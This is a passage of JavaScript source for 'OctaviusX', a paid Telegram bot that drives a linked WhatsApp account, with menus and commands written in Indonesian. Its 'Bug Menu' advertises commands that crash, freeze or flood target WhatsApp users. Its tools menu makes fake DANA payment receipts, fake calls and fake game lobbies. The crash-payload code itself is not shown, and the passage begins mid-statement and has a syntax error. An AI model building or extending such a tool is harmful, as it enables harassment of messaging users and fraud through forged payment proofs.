⢸⣿⣿⣾⣿⡇⠀⢸⠋⠀⠀⠀⠸⠀⠀⠀⠉⠛⣿⣷⣟⣙⠿⣿⡁⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⡿⢿⣿⠟⢿⡏⠀⢸⠉⠁⠀⠈⢹⢿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⡇⠀⠾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠍⠛⢿⠷⣶⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣆⠀⠁⠀⠀⠀⠀⠈⠀⠀⠀⠀⠞⠀⠘⣿⣿⣟
⢸⣿⣿⣏⣿⡗⠀⠀⠀⠀⠀⠀⣠⠒⠊⠉⠉⠉⢉⣒⠦⣄⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣤⣿⣿⠿⠶⠶⢤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇
⠘⣿⣷⣿⡝⠁⠀⠀⠀⠀⠀⠉⢁⠀⠀⠀⠀⠀⠀⠈⢹⣮⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠙⠀⠀⠀⠀⠀⠀⠈⠛⢆⠀⠀⠀⠀⠀⠀⠀⠋⢻⡇
⠀⠻⣿⣤⠁⠀⠀⠀⠀⠀⣤⠈⠋⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡄⠀⠀⠀⠀⠀⢠⡿⠁
⠀⠀⢻⣧⡀⠀⠀⠀⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡀⠀⠀⠀⠀⣼⠃⠀
⠀⠀⠈⢿⡄⠀⠀⠀⠀⠀⠙⣧⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣧⠀⠀⣀⡼⠁⠀⠀
⠀⠀⠀⠀⠙⢶⡀⠀⠀⠀⠀⢿⣷⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡟⠀⠀⠛⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠙⠏⠉⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⢿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣷⣀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣞⣿⣿⣿⣿⣿⣿⣿⣼⣿⣿⣿⡿⣾⢻⣿⣿⡟⢻⣿⣿⣿⣿⣿⣿⠙⠳⢤⣀⣀⣀⣠⡤⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

「I」 「〔 SENDER CONNECT 〕」 「I」 `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                console.clear(); 
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};



const { RichHTMLBuilder: HTML } = RichMessage;

const checkWhatsAppConnection = async (ctx, next) => {
  if (isWhatsAppConnected && sock?.user) {
    return next();
  }

  const msg = new HTML()

    .heading(
      1,
      HTML.customEmoji("5350759382223186548", "📡") +
      " Sender Offline"
    )

    .divider()

    .blockQuote(
      HTML.bold("WhatsApp Sender is currently disconnected.")
    )

    .paragraph(
      "Bot tidak dapat menjalankan fitur yang membutuhkan koneksi WhatsApp.\n\n" +
      "Silakan hubungkan Sender terlebih dahulu sebelum menggunakan command ini."
    )

    .divider()

    .table(
      [
        ["Status", "Value"],
        ["Connection", "Offline ❌"],
        ["Required", "WhatsApp Sender"],
        ["Action", "Connect Sender"]
      ],
      {
        bordered: true,
        striped: true,
        hasHeader: true
      }
    )

    .divider()

    .taskList(
      {
        text: "Telegram Connected",
        checked: true
      },
      {
        text: "WhatsApp Sender Connected",
        checked: false
      }
    )

    .details(
      "📖 Information",
      "Pastikan perangkat WhatsApp telah login kembali. Setelah status berubah menjadi Connected, seluruh command akan kembali dapat digunakan."
    )

    .footer(
      "© OctaviusX  " +
      HTML.customEmoji("5429528223438367408", "👑")
    )

    .build();

  return await ctx.sendRichMessage(msg, {
    protect_content: true,
    reply_markup: Markup.inlineKeyboard([
      [
        {
          text: "Developer",
          url: "https://t.me/EstehMD",
          style: "success",
          icon_custom_emoji_id: "5350280858441903578"
        }
      ]
    ]).reply_markup
  });
};

// Menu START
const PHOTOS = [
  "https://files.catbox.moe/gk8k8q.jpg",
  "https://files.catbox.moe/r2xs2x.jpg",
  "https://files.catbox.moe/gk8k8q.jpg"
];

// ============ COMMAND START (PV + GROUP SAMA) ============
bot.command('start', async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const waStatus = sock && sock.user ? "Terhubung" : "Tidak Terhubung";

  // ============ CEK JENIS CHAT ============
  const isPrivate = ctx.chat.type === 'private';
  const DRAFT_ID = 1;

  // ============ DRAFT HANYA DI PRIVATE CHAT ============
  if (isPrivate) {
    const steps = [
      "⚡ Initializing OctaviusX...",
      "📡 Connecting Telegram...",
      "🛡️ Loading Security Module...",
      "📦 Loading Resources...",
      "👑 Preparing Rich Menu...",
      "✨ Done!"
    ];

    for (const step of steps) {
      await ctx.sendRichMessageDraft(
        DRAFT_ID,
        new HTML().thinking(HTML.italic(step)).build()
      );
      await new Promise((r) => setTimeout(r, 900));
    }
  }

  // ============ BUILD RICH MESSAGE (SAMA UNTUK PV & GROUP) ============
  const msg = new HTML()
    .slideshow(
      `<img src="${PHOTOS[0]}"/>`,
      `<img src="${PHOTOS[1]}"/>`,
      `<img src="${PHOTOS[2]}"/>`
    )
    .heading(1, "OctaviusX" + HTML.customEmoji("5316968838691043737", "🕷"))
    .paragraph(
      `𝑊𝑒𝑙𝑐𝑜𝑚𝑒 𝑡𝑜 𝑂𝑐𝑡𝑎𝑣𝑖𝑢𝑠𝑋, 𝑉𝑣𝑖𝑝 𝑀𝑒𝑛𝑢 𝑂𝑛𝑙𝑦 𝑃𝑟𝑒𝑚𝑖𝑢𝑚 𝑈𝑠𝑒𝑟 𝐶𝑎𝑛 𝑈𝑠𝑒 𝑇ℎ𝑖𝑠 𝐵𝑜𝑡` +
      HTML.customEmoji("5429528223438367408", "👑")
    )
    .divider()
    .heading(2, HTML.customEmoji("5352590867947349905", "💋") + " Bot Information")
    .table(
      [
        ["Information", "Detail"],
        ["Username", `${Name}`],
        ["UserId", `${userId}`],
        ["Name Bot", "OctaviusX "],
        ["Version", "2.0 Vip"],
        ["Status", `${waStatus}`],
        ["Runtine", `${waktuRunPanel}`],
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .details(
      "⚙️ Important Information",
      `
      Jika Ada Kendala Dengan Bug
      Atau Error Bisa Hubungi @EstehMD2
      Dan Saran Atau Apa Silahkan Di Hubungi. 
      `
    )
    .blockQuote(HTML.bold("「 ! 」Select Menu Below 「 ! 」"))
    .build();

  // ============ KIRIM RICH MESSAGE ============
  await ctx.sendRichMessage(msg, {
    protect_content: false, 
    reply_markup: Markup.inlineKeyboard([
      [
        {
          text: "Bug Menu",
          callback_data: "holee",
          style: "primary", 
          icon_custom_emoji_id: "5350759382223186548"
        }
      ], 
      [
        {
          text: "Tools Menu",
          callback_data: "tools",
          style: "primary", 
          icon_custom_emoji_id: "5242284369640441680"
        }
      ], 
      [
        {
          text: "Owner Menu",
          callback_data: "p",
          style: "danger", 
          icon_custom_emoji_id: "5350725709679584478"
        },
        {
          text: "Thanks To",
          callback_data: "tqto",
          style: "danger", 
          icon_custom_emoji_id: "4904687665158292410"
        }
      ],
      [
        {
          text: "Developer Script",
          url: "https://t.me/EstehMD",
          style: "success", 
          icon_custom_emoji_id: "5350280858441903578"
        }
      ], 
      [
        {
          text: "Channel Developer",
          url: "https://t.me/AboutNythera",
          style: "success", 
          icon_custom_emoji_id: "5258513401784573443"
        }
      ]
    ]).reply_markup
  });
});

// Menu SETTING
bot.action("p", async (ctx) => {
  await ctx.answerCbQuery();
  
  try {
    await ctx.deleteMessage();
  } catch (e) {}
  
  const userId = ctx.from.id.toString();
  const ICON_BACK = "5845943483382110702";
  
  const msg = new HTML()
    .slideshow(
      `<img src="${PHOTOS[0]}"/>`,
      `<img src="${PHOTOS[1]}"/>`,
      `<img src="${PHOTOS[2]}"/>`
    )
    .heading(2, HTML.customEmoji("5231200819986047254", "📊") + " Informasi Setting Menu")
    .table(
      [
        ['Command', 'Example', 'Description'],
        ['/addadmin', `/addadmin ${userId}`, 'Tambah admin'],
        ['/deladmin', `/deladmin ${userId}`, 'Hapus admin'],
        ['/addprem', `/addprem ${userId}`, 'Tambah premium'],
        ['/delprem', `/delprem ${userId}`, 'Hapus premium'],
        ['/cekprem', '/cekprem', 'Cek status premium'],
        ['/connect', '/connect 628xxx', 'Connect WA'],
        ['/resetsession', '/resetsession', 'Reset session'],
        ['/status', '/status', 'Cek status bot'],
        ['/addgrouppremium', '/addgrouppremium 30', 'Tambah premium group'],
        ['/delgrouppremium', '/delgrouppremium', 'Hapus premium group'],
        ['/listgrouppremium', '/listgrouppremium', 'List semua premium group'],
        ['/cekpremiumgroup', '/cekpremiumgroup', 'Cek status premium group']
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .footer(" OctaviusX  " + HTML.customEmoji("5352590867947349905", "💋"))
    .build();

  await ctx.sendRichMessage(msg, {
    parse_mode: 'HTML',
    reply_markup: Markup.inlineKeyboard([
      [{ text: "⬅️ Back", callback_data: "back_to_start", style: "danger" }]
    ]).reply_markup
  });
});

bot.action("holee", async (ctx) => {
  await ctx.answerCbQuery();
  
  try {
    await ctx.deleteMessage();
  } catch (e) {}
  
  const ICON_BACK = "5845943483382110702";
  const msg = new HTML()
    .slideshow(
      `<img src="${PHOTOS[0]}"/>`,
      `<img src="${PHOTOS[1]}"/>`,
      `<img src="${PHOTOS[2]}"/>`
    )
    .heading(1, HTML.customEmoji("5316968838691043737", "💀") + " BUG MENU")
    .divider()
    .heading(2, HTML.customEmoji("5316968838691043737", "🕷") + " Command Bug")
    .table(
      [
        ["Command", "Efek"],
        ["/intelens", "Delay Spam"],
        ["/necroys", "Crash X Freeze"],
        ["/croysan", "Delay Hard"],
        ["/jennasey", "Delay Hard Invisible"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .heading(2, HTML.customEmoji("5253959125838090076", "✅") + " Information Bugs")
    .taskList(
      { text: "Target Auto C1", checked: true },
      { text: "Bug Gacor", checked: true },
      { text: "Bebas Spam", checked: true },
      { text: "Anti Kenon 80%", checked: true }
    )
    .build();

  await ctx.sendRichMessage(msg, {
    parse_mode: 'HTML',
    reply_markup: Markup.inlineKeyboard([
      [{ text: "⬅️ Back", callback_data: "back_to_start", style: "danger" }]
    ]).reply_markup
  });
});

bot.action("tools", async (ctx) => {
  await ctx.answerCbQuery();
  
  try {
    await ctx.deleteMessage();
  } catch (e) {}
  
  const ICON_BACK = "5845943483382110702";
  const msg = new HTML()
    .slideshow(
      `<img src="${PHOTOS[0]}"/>`,
      `<img src="${PHOTOS[1]}"/>`,
      `<img src="${PHOTOS[2]}"/>`
    )
    .heading(2, HTML.customEmoji("5231200819986047254", "📊") + " Tools Menu")
    .table(
      [
        ["Command", "Description"],
        ["/sketch", "Buat sketsa"],
        ["/fakedana", "Fake DANA"],
        ["/igc", "iPhone Group"],
        ["/iqc", "iPhone Quote"],
        ["/iqcsticker", "iPhone Quote Sticker"],
        ["/music", "Quote Music"],
        ["/tanyaustadz", "Quote Ustadz"],
        ["/threads", "Quote Threads"],
        ["/winquote", "Quote Windows"],
        ["/lobbyff", "Fake Lobby FF"],
        ["/lobbyml", "Fake Lobby ML"],
        ["/storyig", "Story IG"],
        ["/berita", "Quote Berita"],
        ["/randompap", "Random PAP"],
        ["/fakecall", "Fake Call"],
        ["/idcard", "ID Card"],
        ["/spotifycard", "Spotify Card"],
        ["/ttqc", "Quote TikTok"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .footer(" OctaviusX  " + HTML.customEmoji("5352590867947349905", "💋"))
    .build();

  await ctx.sendRichMessage(msg, {
    parse_mode: 'HTML',
    reply_markup: Markup.inlineKeyboard([
      [{ text: "⬅️ Back to Menu", callback_data: "back_to_start", style: "danger" }]
    ]).reply_markup
  });
});

bot.action("tqto", async (ctx) => {
  await ctx.answerCbQuery();
  
  try {
    await ctx.deleteMessage();
  } catch (e) {}
  
  const ICON_BACK = "5845943483382110702";
  const msg = new HTML()
    .slideshow(
      `<img src="${PHOTOS[0]}"/>`,
      `<img src="${PHOTOS[1]}"/>`,
      `<img src="${PHOTOS[2]}"/>`
    )
    .heading(2, HTML.customEmoji("4915896438879159184", "🤝") + " Credits")
    .paragraph("Project ini tidak akan berjalan tanpa kontribusi luar biasa dari orang-orang hebat di bawah ini:")
    .divider()
    .heading(2, HTML.customEmoji("5316740582654112585", "💻") + " Developer Network")
    .table(
      [
        ["Name", "Role"],
        ["EstehMd", "Developer"],
        ["BARZXXZ", "Support"],
        ["K7", "Beta tester"],
      ]
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .details(
      "🤝 Special Thanks",
      "Terima kasih juga kepada seluruh buyer, beta tester, dan komunitas yang terus mendukung pengembangan script ini."
    )
    .divider()
    .footer(" OctaviusX  " + HTML.customEmoji("5352590867947349905", "💋"))
    .build();

  await ctx.sendRichMessage(msg, {
    parse_mode: 'HTML',
    reply_markup: Markup.inlineKeyboard([
      [{ text: "⬅️ Back to Menu", callback_data: "back_to_start", style: "danger" }]
    ]).reply_markup
  });
});
// Tombol Back
bot.action("back_to_start", async (ctx) => {
  await ctx.answerCbQuery();
  
  try {
    await ctx.deleteMessage();
  } catch (e) {}
  
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const waStatus = sock && sock.user ? "Terhubung" : "Tidak Terhubung";
  
  const msg = new HTML()
    .slideshow(
      `<img src="${PHOTOS[0]}"/>`,
      `<img src="${PHOTOS[1]}"/>`,
      `<img src="${PHOTOS[2]}"/>`
    )
    .heading(1, " OctaviusX  " + HTML.customEmoji("5316968838691043737", "🕷"))
    .paragraph(
      `𝑊𝑒𝑙𝑐𝑜𝑚𝑒 𝑡𝑜 𝑆𝑐𝑎𝑟𝑦 𝑑𝑒𝑎𝑡ℎ, 𝑉𝑣𝑖𝑝 𝑀𝑒𝑛𝑢 𝑂𝑛𝑙𝑦 𝑃𝑟𝑒𝑚𝑖𝑢𝑚 𝑈𝑠𝑒𝑟 𝐶𝑎𝑛 𝑈𝑠𝑒 𝑇ℎ𝑖𝑠 𝐵𝑜𝑡` +
      HTML.customEmoji("5429528223438367408", "👑")
    )
    .divider()
    .heading(2, HTML.customEmoji("5352590867947349905", "💋") + " Bot Information")
    .table(
      [
        ["Information", "Detail"],
        ["Username", `${Name}`],
        ["UserId", `${userId}`],
        ["Name Bot", "OctaviusX "],
        ["Version", "2.0 Vip"],
        ["Status", `${waStatus}`],
        ["Runtime", `${waktuRunPanel}`]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .details(
      "⚙️ Important Information",
      "Jika Ada Kendala Dengan Bug Atau Error Bisa Hubungi @ikyymaunikah"
    )
    .blockQuote(HTML.bold("「 ! 」Select Menu Below 「 ! 」"))
    .build();

  await ctx.sendRichMessage(msg, {
    parse_mode: 'HTML',
    reply_markup: Markup.inlineKeyboard([
      [{ text: "🐛 Bug Menu", callback_data: "holee", style: "primary" }],
      [{ text: "🔧 Tools Menu", callback_data: "tools", style: "primary" }],
      [
        { text: "⚙️ Owner Menu", callback_data: "p", style: "danger" },
        { text: "🤝 Thanks To", callback_data: "tqto", style: "danger" }
      ],
      [{ text: "📢 Channel", url: "https://t.me/AbouNythera", style: "success" }]
    ]).reply_markup
  });
});


// BATAS MENU SAMA TOOLS
// ==================== GROUP PREMIUM SYSTEM (TELEKAF) ====================

const premiumGroupsFile = "./Database/premiumGroups.json";

// Buat folder jika belum ada
if (!fs.existsSync("./Database")) {
  fs.mkdirSync("./Database", { recursive: true });
}

// ==================== FUNGSI GROUP PREMIUM ====================

// Load premium groups
function loadPremiumGroups() {
  try {
    if (!fs.existsSync(premiumGroupsFile)) return [];
    return JSON.parse(fs.readFileSync(premiumGroupsFile, "utf8") || "[]");
  } catch {
    return [];
  }
}

// Save premium groups
function savePremiumGroups(data) {
  fs.writeFileSync(premiumGroupsFile, JSON.stringify(data, null, 2));
}

// Cek apakah group premium
function isGroupPremium(groupId) {
  const groups = loadPremiumGroups();
  return groups.some(item => item.startsWith(groupId.toString() + "|"));
}

// Cek expired dan auto hapus
function checkAndCleanExpiredGroups() {
  const groups = loadPremiumGroups();
  let changed = false;
  
  for (const item of groups) {
    const [groupId, expiredTimestamp] = item.split("|");
    if (Date.now() > parseInt(expiredTimestamp)) {
      removeGroupPremium(groupId);
      changed = true;
    }
  }
  
  if (changed) {
    console.log("✅ Expired premium groups cleaned");
  }
}

// Tambah group premium
function addGroupPremium(groupId, days) {
  groupId = groupId.toString();
  let premiumGroups = loadPremiumGroups();
  
  const exists = premiumGroups.some(item => item.startsWith(`${groupId}|`));
  if (exists) {
    return { success: false, message: "Group sudah premium" };
  }
  
  const expiredDate = new Date();
  expiredDate.setDate(expiredDate.getDate() + days);
  const expiredTimestamp = expiredDate.getTime();
  const formattedExpired = expiredDate.toLocaleDateString('id-ID', {
    day: 'numeric',
    month: 'long',
    year: 'numeric'
  });
  
  premiumGroups.push(`${groupId}|${expiredTimestamp}`);
  savePremiumGroups(premiumGroups);
  
  return { 
    success: true, 
    message: `Group premium aktif selama ${days} hari`,
    expired: formattedExpired
  };
}

// Hapus group premium
function removeGroupPremium(groupId) {
  groupId = groupId.toString();
  let premiumGroups = loadPremiumGroups();
  
  const exists = premiumGroups.some(item => item.startsWith(`${groupId}|`));
  if (!exists) return false;
  
  premiumGroups = premiumGroups.filter(item => !item.startsWith(`${groupId}|`));
  savePremiumGroups(premiumGroups);
  return true;
}

// ==================== COMMAND ADD GROUP PREMIUM ====================

// ==================== FUNGSI ADMIN ====================
function isAdminUser(userId) {
    return adminUsers.includes(userId.toString());
}

// ==================== COMMAND ADD GROUP PREMIUM ====================

bot.command('addgrouppremium', async (ctx) => {
    if (!OWNER_IDS.includes(ctx.from.id.toString()) && !isAdminUser(ctx.from.id)) {
        return ctx.reply("❌ Akses hanya untuk owner / admin");
    }
    
    if (ctx.chat.type === "private") {
        return ctx.reply("❌ Command ini hanya bisa digunakan di dalam group");
    }
    
    const args = ctx.message.text.split(" ");
    let days = 30;
    
    if (args.length >= 2) {
        days = parseInt(args[1]);
        if (isNaN(days) || days <= 0) {
            return ctx.reply("❌ Durasi harus angka positif!\nContoh: /addgrouppremium 30");
        }
    }
    
    const groupId = ctx.chat.id.toString();
    const groupName = ctx.chat.title || "Tidak ada nama";
    const adminName = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    
    if (isGroupPremium(groupId)) {
        const msg = new HTML()
            .heading(2, "⚠️ GROUP SUDAH PREMIUM")
            .paragraph(
                HTML.bold("📛 Nama:") + ` ${groupName}\n` +
                HTML.bold("🆔 ID:") + ` <code>${groupId}</code>\n\n` +
                "Group ini sudah terdaftar sebagai premium!"
            )
            .build();
        return await ctx.sendRichMessage(msg);
    }
    
    const result = addGroupPremium(groupId, days);
    
    if (result.success) {
        const msg = new HTML()
            .heading(2, "✅ GROUP PREMIUM BERHASIL DITAMBAHKAN!")
            .divider()
            .paragraph(
                HTML.bold("📛 Nama Group:") + ` ${groupName}\n` +
                HTML.bold("🆔 ID Group:") + ` <code>${groupId}</code>\n` +
                HTML.bold("👤 Ditambahkan oleh:") + ` ${adminName}\n` +
                HTML.bold("📅 Durasi:") + ` ${days} hari\n` +
                HTML.bold("⏰ Expired:") + ` ${result.expired}`
            )
            .divider()
            .paragraph("✨ Group sekarang memiliki akses premium! ✨")
            .build();
        await ctx.sendRichMessage(msg);
    } else {
        const msg = new HTML()
            .heading(2, "❌ GAGAL TAMBAH PREMIUM")
            .paragraph(HTML.bold("📌 Error:") + ` ${result.message}`)
            .build();
        await ctx.sendRichMessage(msg);
    }
});

// ==================== COMMAND DELETE GROUP PREMIUM ====================

bot.command('delgrouppremium', async (ctx) => {
    if (!OWNER_IDS.includes(ctx.from.id.toString()) && !isAdminUser(ctx.from.id)) {
        return ctx.reply("❌ Akses hanya untuk owner / admin");
    }
    
    if (ctx.chat.type === "private") {
        return ctx.reply("❌ Command ini hanya bisa digunakan di dalam group");
    }
    
    const groupId = ctx.chat.id.toString();
    const groupName = ctx.chat.title || "Tidak ada nama";
    
    if (!isGroupPremium(groupId)) {
        const msg = new HTML()
            .heading(2, "⚠️ GROUP TIDAK PREMIUM")
            .paragraph(`Group *${groupName}* tidak terdaftar sebagai premium!`)
            .build();
        return await ctx.sendRichMessage(msg);
    }
    
    const success = removeGroupPremium(groupId);
    
    if (success) {
        const msg = new HTML()
            .heading(2, "✅ GROUP PREMIUM BERHASIL DIHAPUS!")
            .divider()
            .paragraph(
                HTML.bold("📛 Nama:") + ` ${groupName}\n` +
                HTML.bold("🆔 ID:") + ` <code>${groupId}</code>`
            )
            .divider()
            .paragraph("Group tidak lagi memiliki akses premium.")
            .build();
        await ctx.sendRichMessage(msg);
    } else {
        ctx.reply("❌ Gagal menghapus premium!");
    }
});

// ==================== COMMAND LIST GROUP PREMIUM ====================

bot.command('listgrouppremium', async (ctx) => {
    if (!OWNER_IDS.includes(ctx.from.id.toString()) && !isAdminUser(ctx.from.id)) {
        return ctx.reply("❌ Akses hanya untuk owner / admin");
    }
    
    checkAndCleanExpiredGroups();
    const premiumGroups = loadPremiumGroups();
    
    if (premiumGroups.length === 0) {
        const msg = new HTML()
            .heading(2, "📋 DAFTAR GROUP PREMIUM")
            .paragraph("Belum ada group yang terdaftar sebagai premium.")
            .build();
        return await ctx.sendRichMessage(msg);
    }
    
    let listText = "📋 *DAFTAR GROUP PREMIUM*\n\n";
    for (let i = 0; i < premiumGroups.length; i++) {
        const [groupId, expiredTimestamp] = premiumGroups[i].split("|");
        const expiredDate = new Date(parseInt(expiredTimestamp));
        const formattedDate = expiredDate.toLocaleDateString("id-ID", {
            day: "numeric",
            month: "long",
            year: "numeric"
        });
        listText += `${i + 1}. ID: \`${groupId}\`\n`;
        listText += `   Expired: ${formattedDate}\n\n`;
    }
    
    const msg = new HTML()
        .heading(2, "📋 DAFTAR GROUP PREMIUM")
        .pre(listText, 'text')
        .build();
    await ctx.sendRichMessage(msg);
});

// ==================== CEK PREMIUM GROUP ====================

bot.command('cekpremiumgroup', async (ctx) => {
    if (ctx.chat.type === "private") {
        return ctx.reply("❌ Command ini hanya bisa digunakan di dalam group");
    }
    
    const groupId = ctx.chat.id.toString();
    const groupName = ctx.chat.title || "Tidak ada nama";
    
    checkAndCleanExpiredGroups();
    const premiumGroups = loadPremiumGroups();
    const entry = premiumGroups.find(item => item.startsWith(`${groupId}|`));
    
    if (!entry) {
        const msg = new HTML()
            .heading(2, "⚠️ GROUP PREMIUM TIDAK AKTIF")
            .divider()
            .paragraph(
                HTML.bold("📛 Nama:") + ` ${groupName}\n` +
                HTML.bold("🆔 ID:") + ` <code>${groupId}</code>\n` +
                HTML.bold("📌 Status:") + " Tidak premium"
            )
            .divider()
            .paragraph("Hubungi owner untuk upgrade premium!")
            .build();
        return await ctx.sendRichMessage(msg);
    }
    
    const expiredTimestamp = parseInt(entry.split("|")[1]);
    const remaining = expiredTimestamp - Date.now();
    
    if (remaining <= 0) {
        removeGroupPremium(groupId);
        const msg = new HTML()
            .heading(2, "⚠️ GROUP PREMIUM EXPIRED")
            .divider()
            .paragraph(
                HTML.bold("📛 Nama:") + ` ${groupName}\n` +
                HTML.bold("🆔 ID:") + ` <code>${groupId}</code>\n` +
                HTML.bold("📌 Status:") + " Premium telah habis"
            )
            .divider()
            .paragraph("Hubungi owner untuk perpanjang!")
            .build();
        return await ctx.sendRichMessage(msg);
    }
    
    const days = Math.floor(remaining / (24 * 60 * 60 * 1000));
    const hours = Math.floor((remaining % (24 * 60 * 60 * 1000)) / (60 * 60 * 1000));
    
    const msg = new HTML()
        .heading(2, "✅ GROUP PREMIUM AKTIF")
        .divider()
        .paragraph(
            HTML.bold("📛 Nama:") + ` ${groupName}\n` +
            HTML.bold("🆔 ID:") + ` <code>${groupId}</code>\n` +
            HTML.bold("⏰ Sisa waktu:") + ` ${days} hari ${hours} jam\n` +
            HTML.bold("📌 Status:") + " Aktif"
        )
        .build();
    await ctx.sendRichMessage(msg);
});

bot.command('sketch', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');
    const imageUrl = textInput.trim();

    if (!imageUrl) {
        return ctx.reply('Format salah!\nGunakan: /sketch [link_gambar]\nContoh:\n/sketch https://example.com/foto.jpg');
    }

    if (!imageUrl.startsWith('http://') && !imageUrl.startsWith('https://')) {
        return ctx.reply('Input harus berupa link URL gambar yang valid! (Harus diawali http:// atau https://)');
    }

    await ctx.reply('Sedang memproses gambar dari link menjadi sketsa, mohon tunggu...');

    try {
        const apiUrl = `https://api.azbry.com/api/maker/image2sketch?url=${encodeURIComponent(imageUrl)}`;
        
        // Download ke Buffer
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: 'Sukses Mengubah Menjadi Sketsa dari Link!*',
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('Terjadi kesalahan atau server API sedang down.');
    }
});

bot.command('fakedana', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');
    const amount = textInput.trim();

    if (!amount) {
        return ctx.reply('Format salah!\nGunakan: /fakedana [nominal]\n\nContoh:\n/fakedana 50000');
    }

    if (isNaN(amount)) {
        return ctx.reply('Nominal harus berupa angka saja tanpa titik/koma! (Contoh: 100000)');
    }

    await ctx.reply('Sedang memproses gambar prank, mohon tunggu...');

    try {
        const apiUrl = `https://api.azbry.com/api/maker/fakedana?amount=${encodeURIComponent(amount)}`;
        
        // Download ke Buffer
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: `Sukses Generate Fake DANA\nNominal: Rp ${parseInt(amount).toLocaleString('id-ID')}\nGunakan dengan bijak untuk prank teman!`,
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('Terjadi kesalahan saat mengambil data dari API.');
    }
});

bot.command('iqcsticker', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');

    if (!textInput) {
        return ctx.reply('Format salah!\nGunakan: /iqcsticker link_pp | isi teks chat\n\nContoh:\n/iqc_sticker https://example.com/pp.jpg | Info crash wa hari ini');
    }

    const [urlProfil, textChat] = textInput.split('|');

    if (!urlProfil || !textChat) {
        return ctx.reply('Semua kolom harus diisi! Pastikan gunakan pembatas | dengan benar.');
    }

    const linkProfil = urlProfil.trim();
    
    if (!linkProfil.startsWith('http://') && !linkProfil.startsWith('https://')) {
        return ctx.reply('Parameter pertama harus berupa link URL foto profil yang valid!');
    }

    await ctx.reply('Sedang Proses, mohon tunggu...');

    try {
        const apiUrl = `https://api.azbry.com/api/maker/iqc-sticker?text=${encodeURIComponent(textChat.trim())}&img=${encodeURIComponent(linkProfil)}`;
        
        // Download ke Buffer
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: `Sukses Generate iPhone Quote Sticker!`,
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('Terjadi kesalahan saat memproses gambar ke API.');
    }
});

bot.command('iqc', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');
